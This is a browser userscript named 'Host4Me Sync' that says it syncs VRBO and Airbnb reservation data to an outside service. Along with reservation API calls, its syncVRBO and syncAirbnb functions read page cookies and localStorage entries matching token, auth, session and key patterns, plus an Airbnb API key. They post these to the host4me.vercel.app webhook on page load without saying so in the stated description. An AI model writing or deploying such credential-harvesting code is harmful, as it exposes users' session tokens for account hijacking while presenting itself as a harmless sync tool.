// ==UserScript==
// @name         Host4Me Sync
// @namespace    https://host4me.vercel.app
// @version      1.0.0
// @description  Syncs VRBO/Airbnb/Booking.com reservation data to Host4Me platform
// @author       Host4Me
// @match        https://www.vrbo.com/*
// @match        https://owner.vrbo.com/*
// @match        https://www.airbnb.com/*
// @match        https://www.booking.com/*
// @grant        GM_xmlhttpRequest
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_registerMenuCommand
// @grant        GM_notification
// @connect      host4me.vercel.app
// @run-at       document-idle
// ==/UserScript==

(function() {
  'use strict';

  const CONFIG = {
    SYNC_INTERVAL_MS: 4 * 60 * 60 * 1000, // 4 hours
    WEBHOOK_URL: 'https://host4me.vercel.app/webhooks/userscript-sync',
    DASHBOARD_URL: 'https://host4me.vercel.app/dashboard/settings',
    TOKEN_STORAGE_KEY: 'host4me_sync_token',
    STARTUP_DELAY_MS: 3000
  };

  /**
   * Get the last sync timestamp for the current hostname
   */
  function getLastSyncTime(hostname) {
    const key = `host4me_last_sync_${hostname}`;
    const lastSync = GM_getValue(key, 0);
    return parseInt(lastSync, 10);
  }

  /**
   * Set the last sync timestamp for the current hostname
   */
  function setLastSyncTime(hostname) {
    const key = `host4me_last_sync_${hostname}`;
    GM_setValue(key, Date.now().toString());
  }

  /**
   * Check if enough time has passed since last sync
   */
  function shouldSync(hostname) {
    const lastSync = getLastSyncTime(hostname);
    const timeSinceLastSync = Date.now() - lastSync;
    return timeSinceLastSync >= CONFIG.SYNC_INTERVAL_MS;
  }

  /**
   * Get or prompt for sync token
   */
  function getSyncToken() {
    let token = GM_getValue(CONFIG.TOKEN_STORAGE_KEY);

    if (!token) {
      token = prompt(
        `Enter your Host4Me sync token from your dashboard:\n${CONFIG.DASHBOARD_URL}`,
        ''
      );

      if (!token) {
        console.log('Host4Me: Sync token entry cancelled');
        return null;
      }

      GM_setValue(CONFIG.TOKEN_STORAGE_KEY, token);
    }

    return token;
  }

  /**
   * Reset the sync token
   */
  function resetSyncToken() {
    GM_setValue(CONFIG.TOKEN_STORAGE_KEY, '');
    alert('Host4Me sync token has been reset. You will be prompted to enter a new token on next sync.');
  }

  /**
   * Make an HTTP request using GM_xmlhttpRequest
   */
  function gmFetch(url, options = {}) {
    return new Promise((resolve, reject) => {
      const gmOptions = {
        method: options.method || 'GET',
        url: url,
        headers: options.headers || {},
        credentials: options.credentials || 'include',
        onload: function(response) {
          try {
            const data = response.responseText ? JSON.parse(response.responseText) : null;
            resolve({
              status: response.status,
              data: data,
              headers: response.responseHeaders
            });
          } catch (e) {
            resolve({
              status: response.status,
              data: response.responseText,
              headers: response.responseHeaders
            });
          }
        },
        onerror: function(error) {
          reject(new Error(`Request failed: ${url}`));
        },
        ontimeout: function() {
          reject(new Error(`Request timeout: ${url}`));
        }
      };

      if (options.body) {
        gmOptions.data = typeof options.body === 'string' ? options.body : JSON.stringify(options.body);
      }

      GM_xmlhttpRequest(gmOptions);
    });
  }

  /**
   * Capture non-httpOnly cookies
   */
  function getCookies() {
    try {
      return document.cookie;
    } catch (e) {
      console.error('Host4Me: Error reading cookies', e);
      return '';
    }
  }

  /**
   * Capture localStorage keys matching a pattern
   */
  function getLocalStorageData(pattern) {
    const data = {};
    try {
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (pattern.test(key)) {
          try {
            data[key] = localStorage.getItem(key);
          } catch (e) {
            // Silently skip keys we can't read
          }
        }
      }
    } catch (e) {
      console.error('Host4Me: Error reading localStorage', e);
    }
    return data;
  }

  /**
   * Extract userId from VRBO page
   */
  async function extractVRBOUserId() {
    try {
      // Check window.__STATE__
      if (window.__STATE__ && window.__STATE__.tuid) {
        return window.__STATE__.tuid;
      }

      // Check URL pattern /gc/memberDetails/(\d+)/(\d+)/
      const urlMatch = window.location.pathname.match(/\/gc\/memberDetails\/(\d+)\/(\d+)\//);
      if (urlMatch && urlMatch[2]) {
        return urlMatch[2];
      }

      // Try to fetch memberDetails endpoint
      try {
        const response = await gmFetch('https://www.vrbo.com/gc/memberDetails', {
          headers: { 'Accept': 'application/json' }
        });
        if (response.data && response.data.tuid) {
          return response.data.tuid;
        }
      } catch (e) {
        console.error('Host4Me: Error fetching VRBO memberDetails', e);
      }

      return null;
    } catch (e) {
      console.error('Host4Me: Error extracting VRBO userId', e);
      return null;
    }
  }

  /**
   * Sync VRBO data
   */
  async function syncVRBO(token) {
    console.log('Host4Me: Syncing VRBO data...');
    const endpoints = [];
    const userId = await extractVRBOUserId();

    try {
      // Fetch reservation data if userId found
      if (userId) {
        try {
          const inboxResponse = await gmFetch(`https://www.vrbo.com/gc/reservation/inbox/${userId}`, {
            headers: { 'Accept': 'application/json' }
          });
          endpoints.push({
            url: `https://www.vrbo.com/gc/reservation/inbox/${userId}`,
            status: inboxResponse.status,
            data: inboxResponse.data
          });
        } catch (e) {
          console.error('Host4Me: Error fetching VRBO inbox', e);
          endpoints.push({
            url: `https://www.vrbo.com/gc/reservation/inbox/${userId}`,
            status: 0,
            error: e.message
          });
        }

        try {
          const hostedResponse = await gmFetch(`https://www.vrbo.com/gc/booking/hosted/${userId}`, {
            headers: { 'Accept': 'application/json' }
          });
          endpoints.push({
            url: `https://www.vrbo.com/gc/booking/hosted/${userId}`,
            status: hostedResponse.status,
            data: hostedResponse.data
          });
        } catch (e) {
          console.error('Host4Me: Error fetching VRBO hosted', e);
          endpoints.push({
            url: `https://www.vrbo.com/gc/booking/hosted/${userId}`,
            status: 0,
            error: e.message
          });
        }
      }

      // Always fetch owner API endpoints
      try {
        const reservationsResponse = await gmFetch('https://owner.vrbo.com/api/v1/reservations', {
          headers: { 'Accept': 'application/json' }
        });
        endpoints.push({
          url: 'https://owner.vrbo.com/api/v1/reservations',
          status: reservationsResponse.status,
          data: reservationsResponse.data
        });
      } catch (e) {
        console.error('Host4Me: Error fetching VRBO owner reservations', e);
        endpoints.push({
          url: 'https://owner.vrbo.com/api/v1/reservations',
          status: 0,
          error: e.message
        });
      }

      try {
        const propertiesResponse = await gmFetch('https://owner.vrbo.com/api/v1/properties', {
          headers: { 'Accept': 'application/json' }
        });
        endpoints.push({
          url: 'https://owner.vrbo.com/api/v1/properties',
          status: propertiesResponse.status,
          data: propertiesResponse.data
        });
      } catch (e) {
        console.error('Host4Me: Error fetching VRBO owner properties', e);
        endpoints.push({
          url: 'https://owner.vrbo.com/api/v1/properties',
          status: 0,
          error: e.message
        });
      }

      // Capture cookies and localStorage
      const cookies = getCookies();
      const localStorageData = getLocalStorageData(/token|auth|session|user|eg_|tuid|expedia/i);

      const payload = {
        token,
        platform: 'vrbo',
        data: {
          userId: userId || null,
          endpoints,
          cookies,
          localStorage: localStorageData
        }
      };

      await postToWebhook(payload);
      setLastSyncTime(location.hostname);
      showNotification('Host4Me', 'Synced VRBO reservations ✓');
    } catch (e) {
      console.error('Host4Me: Error syncing VRBO data', e);
    }
  }

  /**
   * Check if user is logged into Airbnb
   */
  function isAirbnbLoggedIn() {
    // Check for profile element in header
    if (document.querySelector('[data-testid="header-profile"]')) {
      return true;
    }

    // Check for other logged-in indicators
    if (document.querySelector('[data-testid="signup-link"]') === null) {
      return true;
    }

    return false;
  }

  /**
   * Get Airbnb API key if available
   */
  function getAirbnbApiKey() {
    try {
      // Check window._data_injector
      if (window._data_injector && window._data_injector.airbnb_api_key) {
        return window._data_injector.airbnb_api_key;
      }

      // Check localStorage
      const localStorageData = getLocalStorageData(/airbnb_api_key/i);
      for (const key in localStorageData) {
        if (localStorageData[key]) {
          return localStorageData[key];
        }
      }
    } catch (e) {
      console.error('Host4Me: Error extracting Airbnb API key', e);
    }

    return null;
  }

  /**
   * Sync Airbnb data
   */
  async function syncAirbnb(token) {
    console.log('Host4Me: Syncing Airbnb data...');
    const endpoints = [];

    try {
      if (!isAirbnbLoggedIn()) {
        console.log('Host4Me: Not logged into Airbnb');
        showNotification('Host4Me', 'Not logged into Airbnb');
        return;
      }

      // Fetch host reservations
      try {
        const reservationsResponse = await gmFetch(
          'https://www.airbnb.com/api/v3/HostReservations?operationName=HostReservations&locale=en&currency=USD',
          {
            method: 'GET',
            headers: { 'Accept': 'application/json' }
          }
        );
        endpoints.push({
          url: 'https://www.airbnb.com/api/v3/HostReservations',
          status: reservationsResponse.status,
          data: reservationsResponse.data
        });
      } catch (e) {
        console.error('Host4Me: Error fetching Airbnb reservations', e);
        endpoints.push({
          url: 'https://www.airbnb.com/api/v3/HostReservations',
          status: 0,
          error: e.message
        });
      }

      // Trigger network activity by visiting hosting/reservations
      try {
        const hostingResponse = await gmFetch('https://www.airbnb.com/hosting/reservations', {
          headers: { 'Accept': 'application/json' }
        });
        endpoints.push({
          url: 'https://www.airbnb.com/hosting/reservations',
          status: hostingResponse.status,
          data: null // Don't store full HTML
        });
      } catch (e) {
        console.error('Host4Me: Error fetching Airbnb hosting page', e);
        endpoints.push({
          url: 'https://www.airbnb.com/hosting/reservations',
          status: 0,
          error: e.message
        });
      }

      // Capture cookies and localStorage
      const cookies = getCookies();
      const localStorageData = getLocalStorageData(/token|auth|key|airbnb/i);

      const payload = {
        token,
        platform: 'airbnb',
        data: {
          userId: null,
          endpoints,
          cookies,
          localStorage: localStorageData
        }
      };

      await postToWebhook(payload);
      setLastSyncTime(location.hostname);
      showNotification('Host4Me', 'Synced Airbnb reservations ✓');
    } catch (e) {
      console.error('Host4Me: Error syncing Airbnb data', e);
    }
  }

  /**
   * Sync Booking.com data (placeholder for future implementation)
   */
  async function syncBooking(token) {
    console.log('Host4Me: Booking.com sync coming soon');
    showNotification('Host4Me', 'Booking.com sync coming soon');
  }

  /**
   * Post sync data to webhook
   */
  async function postToWebhook(payload) {
    try {
      const response = await gmFetch(CONFIG.WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: payload
      });

      if (response.status === 200) {
        console.log('Host4Me: Successfully posted to webhook');
      } else {
        console.error(`Host4Me: Webhook returned status ${response.status}`);
      }
    } catch (e) {
      console.error('Host4Me: Error posting to webhook', e);
    }
  }

  /**
   * Show notification (fallback to console.log if GM_notification not available)
   */
  function showNotification(title, text) {
    try {
      if (typeof GM_notification === 'function') {
        GM_notification({
          title: title,
          text: text,
          timeout: 5000
        });
      } else {
        console.log(`${title}: ${text}`);
      }
    } catch (e) {
      console.log(`${title}: ${text}`);
    }
  }

  /**
   * Determine platform from current hostname
   */
  function getPlatform() {
    const hostname = location.hostname;
    if (hostname.includes('vrbo.com')) {
      return 'vrbo';
    } else if (hostname.includes('airbnb.com')) {
      return 'airbnb';
    } else if (hostname.includes('booking.com')) {
      return 'booking';
    }
    return null;
  }

  /**
   * Main sync function
   */
  async function performSync() {
    try {
      const hostname = location.hostname;
      const platform = getPlatform();

      if (!platform) {
        console.log('Host4Me: Unknown platform');
        return;
      }

      if (!shouldSync(hostname)) {
        console.log(`Host4Me: Skipping sync for ${platform} (last sync was recent)`);
        return;
      }

      const token = getSyncToken();
      if (!token) {
        console.log('Host4Me: No sync token available');
        return;
      }

      switch (platform) {
        case 'vrbo':
          await syncVRBO(token);
          break;
        case 'airbnb':
          await syncAirbnb(token);
          break;
        case 'booking':
          await syncBooking(token);
          break;
      }
    } catch (e) {
      console.error('Host4Me: Error in main sync function', e);
    }
  }

  /**
   * Register menu commands
   */
  function registerMenuCommands() {
    GM_registerMenuCommand('Sync Host4Me Now', () => {
      console.log('Host4Me: Manual sync requested');
      // Clear the sync throttle to allow immediate sync
      const hostname = location.hostname;
      GM_setValue(`host4me_last_sync_${hostname}`, '0');
      performSync();
    });

    GM_registerMenuCommand('Reset Host4Me Token', () => {
      resetSyncToken();
    });
  }

  /**
   * Initialize script
   */
  function init() {
    console.log('Host4Me: Script initialized');
    registerMenuCommands();

    // Delay sync to let page fully load
    setTimeout(performSync, CONFIG.STARTUP_DELAY_MS);
  }

  // Start the script
  init();
})();
